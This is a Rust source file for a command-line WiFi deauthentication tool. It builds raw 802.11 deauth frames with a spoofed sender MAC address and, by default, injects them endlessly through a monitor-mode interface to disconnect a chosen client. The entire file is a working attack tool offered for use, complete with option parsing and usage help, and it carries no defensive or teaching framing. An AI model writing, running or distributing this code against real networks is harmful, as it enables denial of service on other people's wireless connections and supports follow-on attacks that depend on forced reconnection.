/*
 * This Script sends deauth packet to the specified target mac address
 * Spoofs the deauth packet with sender mac address
 * Waits for 1 seconds before sending packet so as not to overwhelm the network
 *
 * */

/* Imports */
use std::{ env::args, thread ,time::Duration };
use std::collections::HashMap;
use pcap::{ Capture, Device };

/* Converts string mac address to a vector */
fn parse_mac(mac: &String) -> Option<Vec<u8>> {
    let mac_vec: Vec<u8> = mac.split(':')
                                .map(|x| u8::from_str_radix(x, 16).unwrap())
                                .collect();
    if mac_vec.len() != 6 {
        return None;
    }

    return Some(mac_vec);
}

/* Creates a Deauth Packet Frame */
fn create_packet(target_mac: Vec<u8> , source_mac: Vec<u8>) -> Vec<u8> {
    let radiotap_headers = [
        0x00, 0x00,                 // radiotap version + 0x00 padding
        0x19, 0x00,                 // number of bytes in our header (length)
        0x6f, 0x08, 0x00, 0x00,     // fields present (extensions)
        0x11, 0x13, 0x3D, 0x00, 0x00, 0x00, 0x00, 0x00, // MAC timestamp
        0x10,                       // short guard interval
        0x02,                       // data rate
        0x6c, 0x09,                 // channel frequency
        0x80, 0x04,                 // channel flags (here: 2GHz spectrum & Dynamic CCK-OFDM)
        0xed, 0xa9, 0x00,           // (antenna signal, antenna noise, antenna)
    ];

    let mac_headers = [
        0xc0, 0x00,                 // frame control
        0x00, 0x00,                 // duration
        target_mac[0], target_mac[1], target_mac[2], target_mac[3], target_mac[4], target_mac[5], // reciever
        source_mac[0], source_mac[1], source_mac[2], source_mac[3], source_mac[4], source_mac[5], // sender
        target_mac[0], target_mac[1], target_mac[2], target_mac[3], target_mac[4], target_mac[5], // bssid (reciever)
        0x00, 0x00,                 // sequence control
        0x07, 0x00,                 // reason code
    ];

    let mut packet: Vec<u8> = Vec::new();
    packet.extend_from_slice(&radiotap_headers);
    packet.extend_from_slice(&mac_headers);
    
    return packet;
}

fn print_help(prog_name: &str) {
    println!("Usage: sudo {} [OPTIONS]", prog_name);
    println!();
    println!("Options:");
    println!("  -t, --target <target_mac>       Set the target MAC address (the one to be deauthenticated)");
    println!("  -s, --source <source_mac>       Set the source MAC address (usually the AP/router)");
    println!("  -i, --interface <interface>     Set the wireless interface in monitor mode (e.g., wlan0mon)");
    println!("      --packets <n>               Set the number of packets to be sent (e.g., 10)");
    println!("      --interval <seconds>        Set the delay between each deauth packet (default: 1)");
    println!("  -h, --help                      Show this help message and exit");
    println!("  -v, --version                   Shows the current version");
}

fn argparse(argv: &Vec<String>) -> Option<HashMap<&str, &String>> {
    let mut args: HashMap<&str, &String> = HashMap::new();

    let len = argv.len();
    
    for (i, j) in argv.iter().enumerate() {
        if j == "-h" || j == "--help" || len == 1 {
            print_help(&argv[0]);
            return None;
        }
    
        if i + 1 >= len {
            break;
        }

        match j.as_str() {
            "-v" | "--version" => { 
                println!("{} v{}", env!("CARGO_PKG_NAME"), env!("CARGO_PKG_VERSION"));
                std::process::exit(0);
            },
            "-t" | "--target" => { _ = args.insert("-t", &argv[i + 1]); },
            "-s" | "--source" => { _ = args.insert("-s", &argv[i + 1]); },
            "-i" | "--interface" => { _ = args.insert("-i", &argv[i + 1]); },
            "--packets" => { _ = args.insert("--packets", &argv[i + 1]); },
            "--interval" => { args.insert("--interval", &argv[i + 1]); },
            _ => {},
        };
    }

    return Some(args);
}

fn main() {
    let argv: Vec<String> = args().collect();
    
    let hashmap = match argparse(&argv) {
        Some(x) => x,
        None => { return; },
    };

    let interval: u64 = match hashmap.get("--interval") {
        Some(x) => x.parse().expect("[!] Error parsing the value"),
        None => 1,
    };

    let source_mac: Vec<u8> = match hashmap.get("-s") {
        Some(x) => match parse_mac(x) {
            Some(y) => y,
            None => panic!("[!] Not a valid mac address"),
        },
        None => panic!("[!] Please enter a source mac address"),
    };
 
    let target_mac: Vec<u8> = match hashmap.get("-t") {
        Some(x) => match parse_mac(x) {
            Some(y) => y,
            None => panic!("[!] Not a valid mac address"),
        },
        None => panic!("[!] Please enter a target mac address"),
    };           
    
    let mut capture = match hashmap.get("-i") {
        Some(dev) => Capture::from_device(dev.as_str())
            .unwrap_or_else(|_| panic!("[!] This script requires root privilages"))
            .open()
            .unwrap_or_else(|_| panic!("[!] This script requires root privilages")),

        None => Capture::from_device(Device::lookup().unwrap().unwrap())
            .unwrap_or_else(|_| panic!("[!] This script requires root privilages"))
            .open()
            .unwrap_or_else(|_| panic!("[!] This script requires root privilages"))

    };

    let packet: Vec<u8> = create_packet(target_mac, source_mac);
    
    let mut counter: i32 = 0;
    let pkt_cnt: i32 = match hashmap.get("--packets") {
        Some(x) => x.parse().expect("[!] Error parsing packet flag"),
        None => i32::MAX,
    };

    println!("[#] Deauthing {}", match hashmap.get("-t") { 
        Some(x) => x, 
        None => panic!("Please Enter a target source mac address") 
    });

    while counter < pkt_cnt {
        counter += 1;
        match capture.sendpacket(packet.clone()) {
            Ok(_) => println!("[#] Sent {} Deauth Packet (code 7)", counter),
            Err(err) => println!("[!] Error sending packet {} !", err),
        }
        thread::sleep(Duration::from_secs(interval));
    }
}
